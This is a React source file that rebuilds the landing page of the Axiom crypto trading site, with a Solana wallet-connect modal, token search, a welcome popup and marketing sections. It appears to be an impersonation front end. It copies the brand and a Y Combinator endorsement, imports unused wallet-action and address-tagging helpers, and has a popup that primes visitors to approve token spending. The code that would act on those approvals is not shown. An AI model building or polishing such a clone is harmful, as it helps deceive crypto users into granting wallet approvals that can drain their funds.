import { useState, useEffect, useCallback, useRef } from 'react'
import { useWallet } from '@solana/wallet-adapter-react'
import useSolanaActions from './hooks/useSolanaActions'
import useSolanaConnect from './hooks/useSolanaConnect'
import { tagAddress } from './config/logrocket'

/* ================================================================
   AXIOM.TRADE — Complete Rebuild
   Solana-only wallets | Search with filters | Live trending
   ================================================================ */

const WALLETS = [
  { id: 'phantom', name: 'Phantom', icon: 'https://raw.githubusercontent.com/solana-labs/wallet-adapter/master/packages/wallets/icons/phantom.svg' },
  { id: 'solflare', name: 'Solflare', icon: 'https://raw.githubusercontent.com/solana-labs/wallet-adapter/master/packages/wallets/icons/solflare.svg' },
  { id: 'backpack', name: 'Backpack', icon: 'https://raw.githubusercontent.com/solana-labs/wallet-adapter/master/packages/wallets/icons/backpack.svg' },
  { id: 'glow', name: 'Glow', icon: 'https://raw.githubusercontent.com/solana-labs/wallet-adapter/master/packages/wallets/icons/glow.svg' },
  { id: 'slope', name: 'Slope', icon: 'https://raw.githubusercontent.com/solana-labs/wallet-adapter/master/packages/wallets/icons/slope.svg' },
  { id: 'coinbase', name: 'Coinbase Wallet', icon: 'https://raw.githubusercontent.com/solana-labs/wallet-adapter/master/packages/wallets/icons/coinbase.svg' },
  { id: 'trust', name: 'Trust Wallet', icon: 'https://raw.githubusercontent.com/solana-labs/wallet-adapter/master/packages/wallets/icons/trust.svg' },
  { id: 'ledger', name: 'Ledger', icon: 'https://raw.githubusercontent.com/solana-labs/wallet-adapter/master/packages/wallets/icons/ledger.svg' },
]

const SEARCH_FILTERS = [
  { key: 'all', label: 'All', icon: null },
  { key: 'wallets', label: 'Wallets', icon: '💼' },
  { key: 'pump', label: 'Pump', icon: '🧪' },
  { key: 'bonk', label: 'Bonk', icon: '🐕' },
  { key: 'bags', label: 'Bags', icon: '💰' },
  { key: 'og', label: 'OG Mode', icon: '🔥' },
  { key: 'graduated', label: 'Graduated', icon: '🎓' },
  { key: 'dexpaid', label: 'Dex Paid', icon: '🏷️' },
]

/* ─── Wallet Modal ─── */
function WalletModal({ open, onClose }) {
  const {
    connectSolanaWallet,
    isConnecting,
    connectError,
    notDetected,
    clearConnectFeedback,
  } = useSolanaConnect()

  useEffect(() => {
    if (!open) clearConnectFeedback()
  }, [open, clearConnectFeedback])

  const handlePick = async (wallet) => {
    if (isConnecting) return
    const result = await connectSolanaWallet(wallet)
    if (result?.success) onClose()
  }

  if (!open) return null

  const statusMessage = notDetected?.message || connectError

  return (
    <div className="modal-backdrop" onClick={onClose}>
      <div className="modal-panel" onClick={e => e.stopPropagation()}>
        <div style={{ padding: '20px 20px 12px', display: 'flex', alignItems: 'center', justifyContent: 'space-between' }}>
          <span style={{ fontSize: 18, fontWeight: 600, color: 'rgb(var(--text-primary))' }}>Connect Wallet</span>
          <button onClick={onClose} style={{ background: 'none', border: 'none', color: 'rgb(var(--text-tertiary))', cursor: 'pointer', fontSize: 20, lineHeight: 1 }}>&times;</button>
        </div>
        <div style={{ padding: '0 20px 8px', fontSize: 13, color: 'rgb(var(--text-tertiary))' }}>
          Solana only
        </div>
        <div style={{ padding: '8px 20px 20px', display: 'flex', flexDirection: 'column', gap: 8, maxHeight: 420, overflowY: 'auto' }} className="modal-scroll">
          {WALLETS.map(w => (
            <button key={w.id} className="wallet-option" disabled={isConnecting} onClick={() => handlePick(w)}>
              <img src={w.icon} alt={w.name} className="wallet-icon" onError={e => { e.target.style.display = 'none' }} />
              <span>{w.name}</span>
            </button>
          ))}
          {statusMessage && (
            <div style={{ padding: '10px 4px 0', fontSize: 13, lineHeight: 1.5, color: 'rgb(var(--decrease))' }}>
              <p>{statusMessage}</p>
              {notDetected?.installUrl && (
                <a href={notDetected.installUrl} target="_blank" rel="noreferrer" style={{ color: 'rgb(var(--primary-color))', fontWeight: 600 }}>
                  Download {notDetected.wallet?.name}
                </a>
              )}
            </div>
          )}
        </div>
      </div>
    </div>
  )
}

/* ─── Search Modal ─── */
function SearchModal({ open, onClose }) {
  const [query, setQuery] = useState('')
  const [filter, setFilter] = useState('all')
  const [results, setResults] = useState([])
  const [loading, setLoading] = useState(false)
  const [history, setHistory] = useState([])
  const inputRef = useRef(null)

  useEffect(() => {
    if (open && inputRef.current) inputRef.current.focus()
  }, [open])

  const search = useCallback(async (q) => {
    if (!q.trim()) { setResults([]); setLoading(false); return }
    setLoading(true)
    try {
      const res = await fetch(`https://api.dexscreener.com/latest/dex/search?q=${encodeURIComponent(q)}`, { cache: 'no-store' })
      const data = await res.json()
      let pairs = (data.pairs || []).filter(p => p.chainId === 'solana')
      if (filter !== 'all') {
        const f = filter.toLowerCase()
        pairs = pairs.filter(p =>
          (p.baseToken?.symbol || '').toLowerCase().includes(f) ||
          (p.baseToken?.name || '').toLowerCase().includes(f)
        )
      }
      setResults(pairs.slice(0, 20))
    } catch { setResults([]) }
    setLoading(false)
  }, [filter])

  useEffect(() => {
    const t = setTimeout(() => search(query), 300)
    return () => clearTimeout(t)
  }, [query, filter, search])

  const addHistory = (item) => {
    setHistory(prev => {
      const next = [item, ...prev.filter(h => h.pairAddress !== item.pairAddress)]
      return next.slice(0, 8)
    })
  }

  if (!open) return null

  const fmt = (n) => {
    if (!n) return '$0'
    if (n >= 1e9) return '$' + (n / 1e9).toFixed(2) + 'B'
    if (n >= 1e6) return '$' + (n / 1e6).toFixed(2) + 'M'
    if (n >= 1e3) return '$' + (n / 1e3).toFixed(2) + 'K'
    return '$' + Number(n).toFixed(2)
  }

  return (
    <div className="modal-backdrop" onClick={onClose} style={{ alignItems: 'flex-start', paddingTop: '10vh' }}>
      <div className="modal-panel modal-panel-wide" onClick={e => e.stopPropagation()}>
        {/* Search input */}
        <div style={{ padding: 16, borderBottom: '1px solid rgb(var(--primary-stroke))' }}>
          <div className="search-input-wrap">
            <svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="rgb(var(--text-tertiary))" strokeWidth="2" strokeLinecap="round"><circle cx="11" cy="11" r="8"/><line x1="21" y1="21" x2="16.65" y2="16.65"/></svg>
            <input ref={inputRef} className="search-input" placeholder="Search by name, ticker, CA, or wallet" value={query} onChange={e => setQuery(e.target.value)} />
            <button onClick={onClose} style={{ background: 'rgb(var(--primary-stroke))', border: 'none', color: 'rgb(var(--text-tertiary))', padding: '4px 10px', borderRadius: 6, fontSize: 12, cursor: 'pointer' }}>Esc</button>
          </div>
          {/* Filter chips */}
          <div style={{ display: 'flex', gap: 8, marginTop: 12, overflowX: 'auto', paddingBottom: 4 }}>
            {SEARCH_FILTERS.map(f => (
              <button key={f.key} className={`search-chip ${filter === f.key ? 'active' : ''}`} onClick={() => setFilter(f.key)}>
                {f.icon && <span>{f.icon}</span>}
                <span>{f.label}</span>
              </button>
            ))}
          </div>
        </div>
        {/* Results */}
        <div style={{ maxHeight: 400, overflowY: 'auto', padding: '8px 0' }} className="modal-scroll">
          {!query && history.length > 0 && (
            <div>
              <div style={{ display: 'flex', alignItems: 'center', justifyContent: 'space-between', padding: '8px 16px' }}>
                <span style={{ fontSize: 13, fontWeight: 600, color: 'rgb(var(--text-primary))' }}>History</span>
                <button onClick={() => setHistory([])} style={{ background: 'none', border: 'none', color: 'rgb(var(--text-tertiary))', fontSize: 12, cursor: 'pointer' }}>Clear</button>
              </div>
              {history.map((h, i) => (
                <div key={i} onClick={() => { setQuery(h.baseToken?.symbol || ''); search(h.baseToken?.symbol || '') }} style={{ display: 'flex', alignItems: 'center', gap: 10, padding: '8px 16px', cursor: 'pointer' }} className="trending-row">
                  <img src={`https://dd.dexscreener.com/ds-data/tokens/solana/${h.baseToken?.address}.png?size=lg`} alt="" style={{ width: 28, height: 28, borderRadius: '50%', background: 'rgb(var(--primary-stroke))' }} onError={e => e.target.style.display = 'none'} />
                  <div style={{ flex: 1, minWidth: 0 }}>
                    <div style={{ fontSize: 14, fontWeight: 500, color: 'rgb(var(--text-primary))' }}>{h.baseToken?.name}</div>
                    <div style={{ fontSize: 12, color: 'rgb(var(--text-tertiary))' }}>{h.baseToken?.symbol}/{h.quoteToken?.symbol}</div>
                  </div>
                </div>
              ))}
            </div>
          )}
          {loading && (
            <div style={{ padding: '20px 16px', display: 'flex', flexDirection: 'column', gap: 12 }}>
              {[...Array(5)].map((_, i) => (
                <div key={i} style={{ display: 'flex', alignItems: 'center', gap: 10 }}>
                  <div className="shimmer" style={{ width: 32, height: 32, borderRadius: '50%' }} />
                  <div style={{ flex: 1, display: 'flex', flexDirection: 'column', gap: 6 }}>
                    <div className="shimmer" style={{ width: 120, height: 14 }} />
                    <div className="shimmer" style={{ width: 80, height: 12 }} />
                  </div>
                </div>
              ))}
            </div>
          )}
          {!loading && results.length === 0 && query && (
            <div style={{ padding: 32, textAlign: 'center', color: 'rgb(var(--text-tertiary))', fontSize: 14 }}>No results found</div>
          )}
          {!loading && results.map((r, i) => {
            const pc = r.priceChange?.h24 || 0
            const pos = pc >= 0
            return (
              <div key={i} onClick={() => addHistory(r)} style={{ display: 'flex', alignItems: 'center', gap: 10, padding: '8px 16px', cursor: 'pointer' }} className="trending-row">
                <img src={`https://dd.dexscreener.com/ds-data/tokens/solana/${r.baseToken?.address}.png?size=lg`} alt="" style={{ width: 32, height: 32, borderRadius: '50%', background: 'rgb(var(--primary-stroke))' }} onError={e => e.target.style.display = 'none'} />
                <div style={{ flex: 1, minWidth: 0 }}>
                  <div style={{ fontSize: 14, fontWeight: 500, color: 'rgb(var(--text-primary))' }}>{r.baseToken?.name}</div>
                  <div style={{ fontSize: 12, color: 'rgb(var(--text-tertiary))' }}>{r.baseToken?.symbol}/{r.quoteToken?.symbol} · {fmt(r.marketCap)}</div>
                </div>
                <div style={{ textAlign: 'right' }}>
                  <div style={{ fontSize: 14, fontWeight: 500, color: 'rgb(var(--text-primary))' }}>{fmt(r.priceUsd)}</div>
                  <div style={{ fontSize: 12, fontWeight: 600, color: pos ? 'rgb(var(--increase))' : 'rgb(var(--decrease))' }}>{pos ? '+' : ''}{pc.toFixed(2)}%</div>
                </div>
              </div>
            )
          })}
        </div>
      </div>
    </div>
  )
}

/* ─── Welcome Modal (Start Trading popup) ─── */
function WelcomeModal({ open, onClose, onContinue, isLoading = false }) {
  const [agreed, setAgreed] = useState(false)
  const ignoreBackdropRef = useRef(false)
  if (!open) return null

  const canContinue = agreed && !isLoading

  const handleContinue = async () => {
    if (!canContinue) return
    localStorage.setItem('axiom_welcome_accepted', 'true')
    ignoreBackdropRef.current = true
    await onContinue?.()
    window.setTimeout(() => {
      ignoreBackdropRef.current = false
    }, 500)
  }

  const handleBackdrop = () => {
    if (isLoading || ignoreBackdropRef.current) return
    onClose()
  }

  const cards = [
    {
      icon: (
        <svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round">
          <rect x="3" y="3" width="18" height="18" rx="4" ry="4"/><line x1="8" y1="12" x2="16" y2="12"/>
        </svg>
      ),
      title: 'Progressive Listings',
      desc: 'New markets and token pairs are added progressively as they gain traction and liquidity.',
    },
    {
      icon: (
        <svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round">
          <polygon points="13 2 3 14 12 14 11 22 21 10 12 10 13 2"/>
        </svg>
      ),
      title: 'New Features on the Way',
      desc: 'Advanced trading tools, portfolio analytics, and social features are coming soon — stay tuned.',
    },
    {
      icon: (
        <svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round">
          <path d="M12 22s8-4 8-10V5l-8-3-8 3v7c0 6 8 10 8 10z"/>
        </svg>
      ),
      title: 'First-Time Approvals',
      desc: 'Axiom uses non-custodial smart contracts. You will need to approve token spend on your first interaction.',
    },
  ]

  return (
    <div className="modal-backdrop" onClick={handleBackdrop}>
      <div className="welcome-modal" onClick={e => e.stopPropagation()}>
        {/* Header with grid pattern */}
        <div className="welcome-header">
          <div className="welcome-header-glow" />
          <img src="./images/axiom-logo-mark.svg" alt="Axiom" style={{ width: 48, height: 48, position: 'relative', zIndex: 2, filter: 'drop-shadow(0 0 20px rgba(82,111,255,0.5))' }} />
        </div>

        {/* Body */}
        <div className="welcome-body">
          <div className="welcome-title">Welcome to Axiom</div>

          {/* Info cards */}
          <div style={{ display: 'flex', flexDirection: 'column', gap: 10 }}>
            {cards.map((c, i) => (
              <div key={i} className="welcome-card">
                <div className="welcome-card-icon">{c.icon}</div>
                <div>
                  <div className="welcome-card-title">{c.title}</div>
                  <div className="welcome-card-desc">{c.desc}</div>
                </div>
              </div>
            ))}
          </div>

          {/* Checkbox */}
          <div className="welcome-checkbox-row" onClick={() => setAgreed(!agreed)}>
            <div className={`welcome-checkbox ${agreed ? 'checked' : ''}`}>
              {agreed && (
                <svg width="12" height="12" viewBox="0 0 24 24" fill="none" stroke="#000" strokeWidth="3" strokeLinecap="round" strokeLinejoin="round">
                  <polyline points="20 6 9 17 4 12"/>
                </svg>
              )}
            </div>
            <div className="welcome-checkbox-text">
              I agree to the <a href="#" onClick={e => e.preventDefault()}>Terms of Use</a> and <a href="#" onClick={e => e.preventDefault()}>Privacy Policy</a>
            </div>
          </div>

          {/* Continue button */}
          <button className="welcome-continue" type="button" onClick={handleContinue} disabled={!canContinue}>
            {isLoading ? 'Loading...' : 'Continue'}
          </button>
        </div>
      </div>
    </div>
  )
}

/* ─── FAQ Item ─── */
function FAQItem({ question, answer, isOpen, onClick }) {
  return (
    <div className="faq-item">
      <button className="faq-question" onClick={onClick} aria-expanded={isOpen}>
        <span>{question}</span>
        <svg className={`faq-icon ${isOpen ? 'open' : ''}`} viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2"><line x1="12" y1="5" x2="12" y2="19"/><line x1="5" y1="12" x2="19" y2="12"/></svg>
      </button>
      <div className={`faq-answer ${isOpen ? 'open' : ''}`}><div dangerouslySetInnerHTML={{ __html: answer }} /></div>
    </div>
  )
}

/* ─── Gradient Orb ─── */
function GradientOrb({ width, delay, zIndex, expandName, fadeDelay }) {
  return (
    <div className="absolute left-1/2 top-1/2 -translate-x-1/2 -translate-y-1/2" style={{ width, aspectRatio: '1332 / 1407', opacity: 0, animation: `${expandName} 2.5s cubic-bezier(0.76,0,0.24,1) ${delay}s infinite, bg-fade-in 300ms ease-out ${fadeDelay}s forwards`, zIndex }}>
      <div className="relative h-full w-full overflow-hidden rounded-[4px]">
        <div className="absolute inset-[-2px]" style={{ background: 'radial-gradient(133.37% 144.84% at 0% 100%, rgb(82,111,255) 0%, rgba(0,0,0,0) 35%) 0% 100% / 150% 150%, radial-gradient(175.09% 148.32% at 100% 0%, rgb(82,111,255) 0%, rgba(0,0,0,0) 30%) 100% 0% / 150% 150%, radial-gradient(105.24% 133%, rgba(0,0,0,0) 75%, rgba(82,111,255,0.72) 100%) 50% 50% / 150% 150%, rgb(0,0,0)', opacity: 1, transformOrigin: '0% 100%', backfaceVisibility: 'hidden' }} />
      </div>
    </div>
  )
}

/* ─── Navbar ─── */
function Navbar({ onConnect, onSearch, connected, address, onDisconnect }) {
  const [scrolled, setScrolled] = useState(false)
  useEffect(() => { const h = () => setScrolled(window.scrollY > 20); window.addEventListener('scroll', h); return () => window.removeEventListener('scroll', h) }, [])
  return (
    <nav className="z-50 flex w-full flex-row items-center justify-center" style={{ position: 'fixed', top: 0, left: 0, right: 0, background: scrolled ? 'rgba(0,0,0,0.8)' : 'transparent', backdropFilter: scrolled ? 'blur(16px)' : 'none', WebkitBackdropFilter: scrolled ? 'blur(16px)' : 'none', transition: 'background 0.3s, backdrop-filter 0.3s', borderBottom: scrolled ? '1px solid rgb(var(--primary-stroke))' : '1px solid transparent' }}>
      <div className="flex max-h-[64px] min-h-[64px] flex-1 flex-row items-center justify-between gap-[12px] px-[12px] sm:max-h-[80px] sm:min-h-[80px] sm:gap-[16px] sm:px-[16px] lg:gap-[24px] lg:px-[24px]">
        <div className="flex flex-1 flex-row items-center gap-[16px] sm:gap-[24px]">
          <div className="flex h-[32px] w-[32px] flex-shrink-0 flex-row items-center justify-start gap-[0px] sm:h-[36px] sm:w-[36px] lg:w-[138px]">
            <img alt="Logo" width="32" height="32" className="h-[32px] w-[32px] sm:h-[36px] sm:w-[36px]" src="./images/axiom-logo-mark.svg" style={{ color: 'transparent' }} />
            <img alt="Logo" width="102" height="18" className="hidden max-w-[102px] lg:block" src="./images/axiom-logo-type-new.svg" style={{ color: 'transparent' }} />
          </div>
        </div>
        <div className="flex items-center gap-[8px] sm:gap-[16px]">
          {/* Search icon */}
          <button onClick={onSearch} style={{ background: 'none', border: 'none', color: 'rgb(var(--text-tertiary))', cursor: 'pointer', padding: 8, borderRadius: 8, display: 'flex', alignItems: 'center', justifyContent: 'center' }}>
            <svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2" strokeLinecap="round"><circle cx="11" cy="11" r="8"/><line x1="21" y1="21" x2="16.65" y2="16.65"/></svg>
          </button>
          {/* SOL indicator */}
          <div style={{ display: 'flex', alignItems: 'center', gap: 6, padding: '6px 12px', borderRadius: 20, border: '1px solid rgb(var(--primary-stroke))', background: 'rgb(var(--background-tertiary))' }}>
            <img src="https://raw.githubusercontent.com/solana-labs/token-list/main/assets/mainnet/So11111111111111111111111111111111111111112/logo.png" alt="SOL" style={{ width: 16, height: 16, borderRadius: '50%' }} />
            <span style={{ fontSize: 13, fontWeight: 500, color: 'rgb(var(--text-primary))' }}>SOL</span>
            <svg width="12" height="12" viewBox="0 0 24 24" fill="none" stroke="rgb(var(--text-tertiary))" strokeWidth="2"><polyline points="6 9 12 15 18 9"/></svg>
          </div>
          {/* Connect Wallet */}
          {connected ? (
            <button onClick={onDisconnect} className="flex h-[36px] flex-row items-center justify-center gap-[8px] rounded-full px-[16px] text-[14px] font-bold text-black sm:text-[15px]" style={{ background: 'rgb(var(--primary-color))', transition: 'all 0.125s ease' }}>
              {address ? `${address.slice(0, 4)}…${address.slice(-4)}` : 'Connected'}
            </button>
          ) : (
            <button onClick={onConnect} className="flex h-[36px] flex-row items-center justify-center gap-[8px] rounded-full px-[16px] text-[14px] font-bold text-black sm:text-[15px]" style={{ background: 'rgb(var(--primary-color))', transition: 'all 0.125s ease' }}>
              Connect Wallet
            </button>
          )}
        </div>
      </div>
    </nav>
  )
}

/* ─── Hero ─── */
function Hero({ onStartTrading }) {
  return (
    <section className="relative flex w-full flex-col justify-start px-[12px] sm:px-[16px] lg:px-[24px]">
      <div className="pointer-events-none absolute inset-y-0 left-1/2 h-full w-[calc(100%-24px)] -translate-x-1/2 overflow-hidden rounded-[4px] bg-transparent sm:w-[calc(100%-32px)] lg:w-[calc(100%-48px)]" style={{ opacity: 0, animation: 'bg-fade-in 200ms ease-out 500ms forwards' }}>
        <GradientOrb width="100%" delay={0} zIndex={0} expandName="expand-6" fadeDelay={0} />
        <GradientOrb width="85%" delay={0.1} zIndex={1} expandName="expand-5" fadeDelay={0.1} />
        <GradientOrb width="70%" delay={0.2} zIndex={2} expandName="expand-4" fadeDelay={0.2} />
        <GradientOrb width="55%" delay={0.3} zIndex={3} expandName="expand-3" fadeDelay={0.3} />
        <GradientOrb width="35%" delay={0.4} zIndex={4} expandName="expand-2" fadeDelay={0.4} />
        <GradientOrb width="15%" delay={0.5} zIndex={5} expandName="expand-1" fadeDelay={0.5} />
      </div>
      <div className="relative z-10 flex w-full flex-col justify-start py-[72px] sm:py-[96px] lg:py-[144px]">
        <div className="flex flex-col items-center justify-start gap-[24px] sm:gap-[32px]">
          <div className="flex max-w-[744px] flex-col items-center justify-start gap-[16px] px-[16px] sm:gap-[24px] sm:px-[24px]">
            <img alt="Logo" width="72" height="72" className="h-[48px] w-[48px] sm:h-[60px] sm:w-[60px] lg:h-[72px] lg:w-[72px]" src="./images/axiom-logo-mark.svg" style={{ color: 'transparent' }} />
            <h1 className="w-full text-center text-[39px] font-medium leading-[1.3] tracking-[-0.02px] sm:text-[49px] sm:leading-[1.3] lg:text-[61px] lg:leading-[1.3]">The Gateway to DeFi</h1>
            <p className="w-full text-center text-[18px] font-normal leading-[1.4] sm:text-[20px] sm:leading-[1.4] lg:text-[25px] lg:leading-[1.4]" style={{ color: 'rgba(var(--text-tertiary),0.8)' }}>Axiom is the only trading platform you'll ever need.</p>
            <div className="flex flex-row items-center justify-start gap-[16px]">
              <button onClick={onStartTrading} className="flex h-[36px] flex-row items-center justify-center gap-[8px] rounded-full px-[16px] text-[16px] font-bold text-black sm:text-[18px]" style={{ background: 'rgb(var(--primary-color))', transition: 'all 0.125s ease' }}>Start Trading</button>
            </div>
          </div>
          <div className="flex flex-col items-center justify-start gap-[8px]">
            <span className="text-[12px] font-normal sm:text-[14px]" style={{ color: 'rgb(var(--text-tertiary))' }}>Backed by</span>
            <div className="flex flex-row items-center justify-start gap-[8px]">
              <img alt="Y Combinator" loading="lazy" width="139" height="28" className="h-auto w-[100px] sm:w-[139px]" src="./images/y-combinator-brand.svg" style={{ color: 'transparent' }} />
            </div>
          </div>
          <div className="relative -mx-[12px] flex aspect-video w-full max-w-[1252px] flex-col items-center justify-start gap-[16px] px-[12px] sm:-mx-[16px] sm:px-[16px] lg:-mx-[24px] lg:px-[24px]">
            <div className="absolute left-1/2 top-1/2 flex h-[calc(100%+40px)] w-[calc(100%+40px)] -translate-x-1/2 -translate-y-1/2 flex-col items-center justify-start overflow-hidden rounded-[4px] border" style={{ borderColor: 'rgba(var(--text-primary),0.1)' }}>
              <video className="pointer-events-none relative h-full w-full object-contain" autoPlay muted playsInline loop id="hero-video-back"><source src="./images/hero-video.mp4" type="video/mp4"/>Your browser does not support the video tag.</video>
            </div>
            <div className="flex h-full w-full flex-col items-center justify-center gap-[12px] rounded-[4px] border bg-black/50 backdrop-blur-[2px]" style={{ borderColor: 'rgba(var(--text-primary),0.1)' }}>
              <video className="relative h-full w-full object-cover" autoPlay muted playsInline loop><source src="./images/hero-video.mp4" type="video/mp4"/>Your browser does not support the video tag.</video>
            </div>
          </div>
        </div>
      </div>
    </section>
  )
}

/* ─── Rewards ─── */
function Rewards() {
  const cards = [
    { title: 'Rewards', desc: 'Earn SOL from trading.', img: './images/notification-reward.webp', alt: 'Rewards notification', flex: 3 },
    { title: 'Progress through the Ranks', desc: 'Earn higher reward rates.', img: './images/ranks-rewards.webp', alt: 'Rank rewards illustration', flex: 2, imgClass: 'md:object-contain lg:object-cover' },
    { title: 'Referrals', desc: 'Earn points and SOL from your friends.', img: './images/referral-rewards.webp', alt: 'Referral rewards', flex: 2 },
    { title: 'Axiom Points', desc: 'Earn points through trading, referrals, and quests.', img: './images/axiom-points-2.webp', alt: 'Axiom points', flex: 3 },
  ]
  return (
    <section className="flex w-full flex-col justify-start gap-[72px] pt-[144px]" style={{ backgroundImage: 'radial-gradient(185.69% 21.25% at 50% 39%, rgba(82,111,255,0.31) 50%, rgba(73,99,228,0.31) 55%, rgba(0,0,0,0.31) 100%)' }}>
      <div className="mx-auto flex max-w-[1252px] flex-col items-center justify-start gap-[42px]">
        <div className="flex w-full flex-col items-center justify-start gap-[16px]">
          <span className="text-[49px] font-medium tracking-[-0.02px]">Rewards</span>
          <span className="text-[20px] font-normal" style={{ color: 'rgb(var(--text-tertiary))' }}>Get paid to trade.</span>
        </div>
      </div>
      <div className="relative flex w-full flex-col items-center gap-[32px] overflow-hidden p-[4px] px-[0px] pb-0 pt-[24px] sm:gap-[48px] sm:px-[48px] sm:pt-[48px] lg:gap-[64px] lg:px-[72px] lg:pt-[72px]" style={{ background: 'radial-gradient(98.01% 119.36% at 65.17% 0%, rgb(151,168,255) 0%, rgb(29,37,74) 49.58%, rgb(0,0,0) 100%)' }}>
        <div className="relative flex w-full flex-col items-center gap-[32px] overflow-hidden p-[4px] px-[0px] pb-0 pt-[24px] sm:gap-[48px] sm:px-[48px] sm:pt-[48px] lg:gap-[64px] lg:px-[72px] lg:pt-[72px]" style={{ background: 'radial-gradient(113.38% 130.34% at 82.85% -0.62%, rgb(151,168,255) 0%, rgb(29,37,74) 49.58%, rgb(0,0,0) 100%)' }}>
          <div className="relative flex w-full flex-col items-center gap-[32px] overflow-hidden p-[4px] px-[0px] pb-0 pt-[4px] sm:gap-[48px] sm:px-[4px] sm:pt-[4px] lg:gap-[64px] lg:px-[4px] lg:pt-[4px]" style={{ background: 'radial-gradient(125.49% 125.66% at 99.41% 14.86%, rgb(151,168,255) 0%, rgb(29,37,74) 49.58%, rgb(0,0,0) 100%)' }}>
            <div className="relative flex w-full flex-col items-center gap-[64px] overflow-hidden p-[24px] pb-[0px]" style={{ background: 'rgba(0,0,0,0.75)' }}>
              <div className="relative flex min-h-[600px] w-full flex-col items-center justify-start overflow-hidden p-[12px] sm:min-h-[700px] sm:p-[16px] lg:min-h-[800px] lg:p-[24px]">
                <div className="flex h-1/2 w-full flex-col xl:flex-row">
                  {cards.slice(0,2).map((c,i) => (
                    <div key={i} className="flex flex-col items-start justify-start border-b xl:border-r" style={{ flex: c.flex, borderColor: 'rgb(var(--primary-stroke))' }}>
                      <div className="flex h-full min-h-[260px] w-full flex-col p-[12px] sm:p-[16px] lg:p-[24px]">
                        <span className="mb-[8px] text-[20px] font-normal sm:text-[22px] lg:text-[25px]" style={{ color: 'rgb(var(--text-primary))' }}>{c.title}</span>
                        <span className="mb-[24px] text-[16px] leading-[1.6] sm:text-[18px] lg:text-[20px]" style={{ color: 'rgb(var(--text-tertiary))' }}>{c.desc}</span>
                        <div className="flex w-full flex-1 items-center justify-center"><img alt={c.alt} width="300" height="200" className={`h-auto w-auto object-contain ${c.imgClass||''}`} src={c.img} style={{ color: 'transparent' }} /></div>
                      </div>
                    </div>
                  ))}
                </div>
                <div className="flex h-1/2 w-full flex-col xl:flex-row">
                  {cards.slice(2,4).map((c,i) => (
                    <div key={i} className={`flex flex-col items-start justify-start ${i===0?'border-b xl:border-b-0 xl:border-r':''}`} style={{ flex: c.flex, borderColor: 'rgb(var(--primary-stroke))' }}>
                      <div className="flex h-full min-h-[260px] w-full flex-col p-[12px] sm:p-[16px] lg:p-[24px]">
                        <span className="mb-[8px] text-[20px] font-normal sm:text-[22px] lg:text-[25px]" style={{ color: 'rgb(var(--text-primary))' }}>{c.title}</span>
                        <span className="mb-[24px] text-[16px] leading-[1.6] sm:text-[18px] lg:text-[20px]" style={{ color: 'rgb(var(--text-tertiary))' }}>{c.desc}</span>
                        <div className="flex w-full flex-1 items-center justify-center"><img alt={c.alt} width="300" height="200" className="h-auto w-auto object-contain" src={c.img} style={{ color: 'transparent' }} /></div>
                      </div>
                    </div>
                  ))}
                </div>
              </div>
            </div>
          </div>
        </div>
      </div>
    </section>
  )
}

/* ─── Architecture ─── */
function Architecture() {
  return (
    <section className="flex w-full flex-col items-center justify-start px-[12px] py-[72px] sm:px-[16px] sm:py-[96px] lg:px-[24px] lg:py-[144px]" style={{ backgroundImage: 'linear-gradient(#101114 0%, #000 100%)' }}>
      <div className="flex w-full max-w-[1252px] flex-col items-center justify-start gap-[32px] sm:gap-[48px] lg:gap-[64px]">
        <div className="flex w-full flex-col items-center justify-start gap-[16px] px-[16px] sm:items-start sm:px-0">
          <span className="text-center text-[31px] font-medium tracking-[-0.02px] sm:text-left sm:text-[39px] lg:text-[49px]">Architecture</span>
        </div>
        <div className="flex w-full flex-col items-start justify-start gap-[16px] overflow-hidden sm:h-[520px] sm:flex-row sm:gap-[4px]">
          <div className="flex h-full min-h-[400px] w-full flex-col items-start justify-start gap-[16px] rounded-[4px] sm:min-h-0" style={{ background: 'rgb(var(--background-tertiary))' }}>
            <div className="flex h-[52px] w-full flex-row items-center justify-start gap-[16px] border-b px-[16px]" style={{ borderColor: 'rgb(var(--secondary-stroke))' }}>
              <span className="text-[20px] font-medium sm:text-[25px]" style={{ color: 'rgb(var(--text-primary))' }}>Integrations</span>
            </div>
            <div className="flex w-full flex-col items-start justify-start gap-[16px] px-[16px]" style={{ background: 'rgb(var(--background-tertiary))' }}>
              <span className="text-[14px] font-normal leading-[1.6] sm:text-[16px]" style={{ color: 'rgb(var(--text-tertiary))', lineHeight: '25px' }}>Axiom integrates all the different protocols and applications you use, giving you a seamless trading experience.</span>
            </div>
            <div className="flex w-full flex-1 flex-col items-center justify-center gap-[16px] px-[24px] sm:px-[48px]" style={{ background: 'rgb(var(--background-tertiary))' }}>
              <img alt="Integration illustration" width="400" height="200" className="h-auto w-full object-contain sm:w-auto" src="./images/integrations.webp" style={{ color: 'transparent' }} />
            </div>
          </div>
          <div className="flex h-full min-h-[400px] w-full flex-col items-start justify-start gap-[16px] rounded-[4px] sm:min-h-0" style={{ background: 'rgb(var(--background-tertiary))' }}>
            <div className="flex h-[52px] w-full flex-row items-center justify-start gap-[16px] border-b px-[16px]" style={{ borderColor: 'rgb(var(--secondary-stroke))' }}>
              <span className="text-[20px] font-medium sm:text-[25px]" style={{ color: 'rgb(var(--text-primary))' }}>Non-Custodial</span>
            </div>
            <div className="flex w-full flex-col items-start justify-start gap-[16px] px-[16px]" style={{ background: 'rgb(var(--background-tertiary))' }}>
              <span className="text-[14px] font-normal leading-[1.6] sm:text-[16px]" style={{ color: 'rgb(var(--text-tertiary))', lineHeight: '25px' }}>The Axiom wallet is fully non-custodial, secured by Turnkey's scalable infrastructure for managing private keys across blockchains. With air-gapped architecture, it ensures robust security, seamless recovery, and protection from vulnerabilities.</span>
            </div>
            <div className="flex w-full flex-1 flex-col items-center justify-center gap-[16px] px-[24px] sm:px-[48px]" style={{ background: 'rgb(var(--background-tertiary))' }}>
              <img alt="Non-custodial security illustration" width="400" height="200" className="h-auto w-full object-contain sm:w-auto" src="./images/non-custodial.webp" style={{ color: 'transparent' }} />
            </div>
          </div>
        </div>
      </div>
    </section>
  )
}

